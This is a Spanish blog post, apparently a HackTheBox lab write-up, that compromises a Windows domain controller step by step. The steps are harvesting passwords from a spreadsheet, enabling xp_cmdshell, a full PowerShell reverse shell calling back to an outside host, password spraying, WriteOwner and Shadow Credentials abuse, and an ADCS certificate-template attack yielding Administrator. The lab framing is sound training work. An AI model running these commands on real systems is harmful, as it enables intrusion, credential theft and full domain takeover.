---
layout: post
title:  "Writeup EscapeTwo"
date:   2025-05-24
categories: [Writeup, HackTheBox]
image: /images/writeup-escapetwo/Pasted image 20250504120305.png
---

***Dificultad: Media***

***Sistema Operativo: Windows***

---------------------------------------------------------
\
Hoy vamos a 4tac4r este dc Windows. al inicio nos dan unas credenciales de usuario con pocos privilegios, que usamos para acceder a un recurso compartido *smb* encontrando nuevas credenciales en un archivo xlsx, sirviendonos para enumerar y asi encontrar otras credenciales válidas en el dominio lasa cuales tienen acceso a MSSQL, el cual usaremos para enumerar y ver permisos de los usuarios, explotando tambien una mala configuracion y logrando una reverse shell y asi ganando acceso al servidor. Al enumerar el sistema, encontraremos credenciales de SQL que, al probarlas, nos dan acceso vía WinRM. Analizando el dominio, descubres que el usuario tiene permisos de escritura sobre una cuenta que gestiona ADCS. Esto te permite identificar una mala configuración en Active Directory con la ayuda de bloodhound, que explotaremos para obtener el hash de la cuenta de Administrator, logrando así el control total del dominio.

-------------------------------

\
hoy finalmente tenemos el primer writeup de una maquina windows fácil 

esta vez, vemos que al desplegar la maquina nos dicen que vamos a iniciar la maquina con credenciales, asi como en el mundo real cuando nos enfrentamos a una auditoria en un entorno windows:

```creds
rose:  KxEPkKe6R8su
```

primero, vamos a escanear el host y ver los puertos disponibles con nmap:
```bash
nmap -p- --open -sS -Pn -vvv -n --min-rate 5000  10.10.10.10 -oN puertos
```
nos dice:
```
Not shown: 65510 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49702/tcp open  unknown          syn-ack ttl 127
49734/tcp open  unknown          syn-ack ttl 127
49753/tcp open  unknown          syn-ack ttl 127
49812/tcp open  unknown          syn-ack ttl 127
```

los puertos comunes que vemos en un domain controller
```bash
nmap -p53,88,135,139,389,445,464,593,636,1433,3268 -sCV -vvv -n -Pn 10.129.2.36 -oN objetivo
```

```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-04 14:45:56Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-04T14:46:45+00:00; +1m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupp
.
.
.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
.
.
.
```

aquí el ldap tambien nos reporta un nombre de dominio y voy a agregar a mi /etc/hosts:
```bash
10.10.10.10     sequel.htb
```

ahora, enumerando con las credenciales que nos han proporcionado con la herramienta *netexec* el único protocolo que me da resultados es *smb*:
```bash
netexec smb sequel.htb -u rose -p KxEPkKe6R8su --shares
```

con --shares vamos a buscar los recursos compartidos (típico del protocolo smb)
tenemos:
```
SMB         10.129.2.36     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.2.36     445    DC01        [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.129.2.36     445    DC01        [*] Enumerated shares
SMB         10.129.2.36     445    DC01        Share           Permissions     Remark
SMB         10.129.2.36     445    DC01        -----           -----------     ------
SMB         10.129.2.36     445    DC01        Accounting Department READ            
SMB         10.129.2.36     445    DC01        ADMIN$                       Remote Admin
SMB         10.129.2.36     445    DC01        C$                           Default share
SMB         10.129.2.36     445    DC01        IPC$            READ         Remote IPC
SMB         10.129.2.36     445    DC01        NETLOGON        READ         Logon server share 
SMB         10.129.2.36     445    DC01        SYSVOL          READ         Logon server share 
SMB         10.129.2.36     445    DC01        Users           READ            
```

ya con teniendo algunos recursos compartidos, vamos a usar #smbclient 

después de intentar los recursos compartidos disponibles, este es el que me ha dejado conectarme:
```bash
smbclient //sequel.htb/Users -U rose
smbclient //sequel.htb/'Accounting Department' -U rose
```

luego de mirar y buscar por todo el contenido de "users" encontré algo bueno en  "accounting department":

<img src="/images/writeup-escapetwo/Pasted image 20250504215013.png" alt="image">

los archivos xlsx son archivos comprimidos asi que:
```bash
unzip accounts.xlsx
unzip accounting_2024.xlsx
```

y dentro del directorio /xl de accounts encontre:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst><?xml version="1.0" encoding="UTF-8" standalone="yes"?>

```
mas cuentas de usuarios del sistema y contraseñas :D

tambien se mencionan en /xl/worksheets/sheet1.xml

dentro del otro comprimido no he visto mención de los usuarios

con esto, voy a crear una lista y enumerar mas usuarios en el sistema:

```txt
sa@sequel.htb                   'MSSQLP@ssw0rd!'
kevin@sequel.htb                Md9Wlq1E5bZnVDVo
oscar@sequel.htb                86LxLBMgEWaKUnBG
angela@sequel.htb               0fwz7Q4mSpurIt99

```

probé con varias herramientas para verificar cuales eran usuarios validos en el sistema
netexec:
```
netexec smb sequel.htb -u usersn.txt -p pass.txt
```

crackmapexec:
```
crackmapexec mssql sequel.htb -u usersn.txt -p pass.txt
```

kerbrute:
```
./kerbrute userenum --dc 10.129.2.36 -d sequel.htb usersn.txt
```


las 3 coinciden en que las credenciales validas son:
***sequel.htb\oscar:86LxLBMgEWaKUnBG

después de probar varios protocolos con impacket, tenemos conexión con mssql:
```bash
impacket-mssqlclient sequel.htb/oscar:86LxLBMgEWaKUnBG@10.129.2.36 -windows-auth
```

después de estar un rato en la base de datos el usuario no tenia permisos de ejecutar nada, además de que las bases de dato no tenían información. 

volví a ver los usuarios y que en mssql en usuario **sa** es el predeterminado, asi que intente probarlo para conectarme a la base de datos:
```bash
impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@10.129.2.36
```

comandos que he ejecutado:

```mssql
//listar si eres admin:
SELECT is_srvrolemember('sysadmin');

//ver si los permisos de ejecutar comandos en el sistema desde la conexion de la base de datos:
EXEC sp_configure 'xp_cmdshell';
```

si el resultado "run_value" esta a 0, podemos intentar activarlo con:
```mssql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

podemos volver a verificar :
```mssql
EXEC sp_configure 'xp_cmdshell';
```

si esta el "run_value" en 1 podremos ejecutar finalmente una reverse shell:
```powershell
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.10.10'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

en mi maquina ejecute antes:
```bash
nc -lnvp 4444
```

si no se ejecuta, hay que hacer el proceso de nuevo, porque se restablece la configuración de ejecución de comandos

<img src="/images/writeup-escapetwo/Pasted image 20250505103552.png" alt="image">

para empezar a enumerar el sistema, fui hasta la raiz y alli vi un directorio \SQL2019 , dentro hay otro directorio que si lo visitamos veremos:
```powershell
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/8/2024   3:07 PM                1033_ENU_LP                                                           
d-----         6/8/2024   3:07 PM                redist                                                                
d-----         6/8/2024   3:07 PM                resources                                                             
d-----         6/8/2024   3:07 PM                x64                                                                   
-a----        9/24/2019  10:03 PM             45 AUTORUN.INF                                                           
-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML                                                         
-a----         6/8/2024   3:07 PM             16 PackageId.dat                                                         
-a----        9/24/2019  10:03 PM         142944 SETUP.EXE                                                             
-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG                                                      
-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI                                                 
-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL 
```


los archivos .INI son de configuración, al abrirlo:
```powershell
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True

```

tenemos otras credenciales: ***sql_svc:WqSZAF6CysDQbGb3***

podemos dar una vuelta por el sistema, pero esto es lo mas relevante que encontré

al probar con los protocolos, en todos me decía que el usuario estaba activo, pero en rdp y winrm me daba un error con las librerias, lo cual no dejaba ejecutrarlo, asi que voy a intentar conectarme directamente con evil-winrm sino con xfreerdp

no han funcionado tampoco, asi que volví a las carpetas de usuario a ver si me había saltado alguno, pero no encontré mas información

así que, hare fuerza bruta de usuarios, y ver si la contraseña encontrada es valida

con el comando:
```bash
PYTHONWARNINGS=ignore crackmapexec  winrm 10.129.2.83 -u /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success
```

ignorando las advertencias tenemos:
<img src="/images/writeup-escapetwo/Pasted image 20250505114419.png" alt="image">
tenemos a un usuario ryan

usando el comando:
```bash
evil-winrm -i 10.129.2.83 -u ryan -p WqSZAF6CysDQbGb3
```
<img src="/images/writeup-escapetwo/Pasted image 20250505114613.png" alt="image">

finalmente tenemos un usuario con permiso de ejecución remota y en el directorio /Desktop esta la flag del usuario:
<img src="/images/writeup-escapetwo/Pasted image 20250505114820.png" alt="image">

para recolectar información desde nuestro equipo, podemos usar la herramienta bloodhound-python:

primero debemos estar en un entorno de desarrollo para poder instalar la herramienta:
```bash
python3 -m env 3vilsec
source 3vilsec/bin/activate
```
instalar la herramienta:
```bash
pip3 install bloodhound
```

y dentro de un directorio (porque creara muchos archivos) ejecutar:
```bash
bloodhound-python -u ryan -p WqSZAF6CysDQbGb3 -d sequel.htb -ns 10.10.10.10  -c all
```

<img src="/images/writeup-escapetwo/Pasted image 20250506104337.png" alt="image">

vamos a correr en la terminal:
```bash
bloodhound
```

y en nuestro localhost:8080 veremos la interface de inicio de sesion, alli vamos a colocar nuestras credenciales y vamos a cargar todos los archivos que nos ha creado bloodhound-python

buscaremos en la pestana "explore" el nombre del usuario que ya tenemos para conectarnos:

<img src="/images/writeup-escapetwo/Pasted image 20250506214329.png" alt="image">

vamos a añadirlo como usuario "owned" con click derecho:

<img src="/images/writeup-escapetwo/Pasted image 20250506214429.png" alt="image">

y en la pestana izquierda veremos que permisos, ventajas y demas tiene este usuario para buscar la forma de escalar privilegios

<img src="/images/writeup-escapetwo/Pasted image 20250506214709.png" alt="image">

vemos que somos miembro de 4 grupos:

<img src="/images/writeup-escapetwo/Pasted image 20250506214831.png" alt="image">

si miramos mas al usuario ryan, veremos que  en la seccion outbound object control, tenemos permisos *writeOwner* sobre el usuario: CA_SVC
<img src="/images/writeup-escapetwo/Pasted image 20250506215655.png" alt="image">

investigando, ese permiso nos permite hacernos propietarios de la cuenta de ese usuario, para modificar permisos y darnos control total  y asi resetear su contraseña e iniciar sesión como ese usuario

por que no atacar directamente al administrador? porque bloodhound no me da pistas sobre alguna conexión, además muchas veces en las maquinas de hack the box, se tienen este tipo de movimientos laterales, posiblemente dentro de este usuario encontraremos algo mas para escalar a Administrator

vamos a reactivar el entorno de desarrollo python con:
```bash
source 3vil/bin/activate
```

vamos a instalar la herramienta:
```bash
pip3 install bloodAD
```

la usaremos asi:
```bash
bloodyAD --host 10.129.26.148 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC RYAN

```
nos dira:
```
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by RYAN on CA_SVC
```

ahora, para darnos el control total:
```bash
bloodyAD --host 10.129.26.148 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll CA_SVC RYAN
```

nos dira:
```
[+] RYAN has now GenericAll on CA_SVC
```

si no lo cambia, hazlo de nuevo, recuerda que las maquinas tienen scripts para deshacer algunas configuraciones o cargas maliciosas

y le cambiaremos su contraseña:
```bash
bloodyAD --host 10.129.26.148 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set password CA_SVC 3vilsec
```
***[+] Password changed successfully!***

pero al intentar ver si las credenciales realmente han cambiado con crackmapexec o netexec el resultado es negativo no se cambia la contraseña

podría intentar una técnica conocida como **Shadow Credentials**:
dado que podemos manipular totalmente al usuario ca_svc, vamos a intentar manipular el atributo *msDS-KeyCredentialLink* que almacena datos en bruto para la autenticación sin contraseña

para esto, necesitamos una herramienta llamada pywhisker:
https://github.com/ShutdownRepo/pywhisker
```bash
git clone https://github.com/ShutdownRepo/pywhisker
cd pywhisker
pip3 install .
```

esto se va a instalar en tu entorno, tambien fuera de esa carpeta necesitaremos las herramientas del repositorio PKINITtools:
```bash
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
pip3 install .
```

ahora, lo que haremos serán los comando en el siguiente orden (recuerda tener presente los directorios donde están las herramientas):

1 Vamos a apoderarnos de la cuenta del usuario ca_svc gracias al atributo *writeowner* que nos permite modificar NTSecurityDescriptor:
```bash
bloodyAD --host 10.10.10.10 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC RYAN 
```

2 me voy a otorgar permisos generales sobre la cuenta, para tener la capacidad de cambiar cualquier atributo, lo que nos va a permitir añadir claves kerberos:
```bash
bloodyAD --host 10.129.231.236 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll CA_SVC RYAN
```

3 voy a ejecutar un ataque de "*Shadow Credentials*" agregando una clave kerberos en el atributo *msDS-KeyCredentialLink* con la herramienta pywhisker, que va a generar un par de certificados en formato PEM, los agregara al usuario y nos lo dejara en el directorio. esto será crucial, dado que nos permitirá autenticarnos con certificados y no con hash o contraseñas:
```bash
python3 pywhisker.py -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --dc-ip 10.129.231.236 --target CA_svc --action add --filename CACert --export PEM
```

4 solicitar un TGT (ticket granting ticket) para el usuario ca_svc usando los certificados PEM para autenticarnos con kerberos y lo guardamos en ca_svc.ccache, esto sirve para no cambiar la contraseña del usuario ca_svc:
```bash
python3 ../../PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem sequel.htb/ca_svc ca_svc.ccache
```

5 configurar la una variable de entorno KRB5ccname para que apunte al tgt para luego autenticarnos sin credenciales ya que esa variable es parte de las variables kerberos en linux:
```bash
export KRB5CCNAME=ca_svc.ccache
```

6 vamos a generar un hash NTLM a partir del TGT:
```bash
python ../../PKINITtools/getnthash.py -key d755c02de07677f61796d56e993cdbfd31c1a95b118b3b29c44d49e7ad564aa7 sequel.htb/ca_svc
```

para validar la autenticacion en el sistema con el hash ntlm usaremos (recuerda usar el hash que te ha dado la herramienta anterior):
```bash
netexec smb 10.129.231.236 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
```

<img src="/images/writeup-escapetwo/Pasted image 20250507083108.png" alt="image">

finalmente tenemos un otro usuario autenticado pero no tenemos permisos para conectarnos con rdp o winrm

buscando modos de enumerar con el usuario que hemos powneado podemos buscar configuraciones, plantillas vulnerables o certificados mal configurados, voy a usar la herramienta *certipy-ad* en el entorno de desarrollo python:
```bash
pip3 install certipy-ad
```

y vamos a enumerar con nuestro usuario recien conseguido y su hash NTLM:
```bash
certipy-ad find -vulnerable -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.231.236

```

nos dira:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250507090408_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250507090408_Certipy.txt'
[*] Saved JSON output to '20250507090408_Certipy.json'
```

si miramos el archivo de salida .json vemos al final del todo:

<img src="/images/writeup-escapetwo/Pasted image 20250507090815.png" alt="image">
la vulnerabilidad que podremos explotar con este usuario! en la plantilla de certificado "DunderMifflinAuthentication"

aunque esta plantilla tiene una limitacion, y es que no podemos agregar un SAN arbitrario porque enrolle supplies subject es false:
<img src="/images/writeup-escapetwo/Pasted image 20250507093222.png" alt="image">

para explotar esto, vamos primero a modificar la plantilla 

pero por el reinicio, debemos habilitar los permisos del usuario de nuevo (si te da error)
```bash
bloodyAD --host 10.129.231.236 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC RYAN  
```
luego:
```
bloodyAD --host 10.129.231.236 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll CA_SVC RYAN
```

para volver la plantilla vulnerable y modificarle los permisos y a la vez creando una copia de seguridad:
```bash
certipy-ad template -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -save-old
```

y para pedir el certificado como administradores asignandonos un SAN aletorio porque ahora lo podemos controlar, vamos a usar:
```bash
certipy-ad req -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

eso nos deja un archivo .pfx:

<img src="/images/writeup-escapetwo/Pasted image 20250507100056.png" alt="image">

que usaremos para tener un hash como administrador:
```bash
certipy-ad auth -pfx administrator.pfx -domain sequel.htb
```



con esto, nos dará el hash y lo almacenara directamente en una variable, asi que solo debemos actualizar la kerb5 para que valga lo mismo y nos podremos autenticar:
```bash
export KRB5CCNAME=administrator.ccache
```

<img src="/images/writeup-escapetwo/Pasted image 20250507101057.png" alt="image">

uso psexec.py para autenticarme:
```bash
psexec.py -k -no-pass sequel.htb/administrator@DC01.sequel.htb
```

y somos admin:

<img src="/images/writeup-escapetwo/Pasted image 20250507101224.png" alt="image">

realmente pienso que esta maquina es mas como media (debemos hacer mas active directory)


------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld<

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">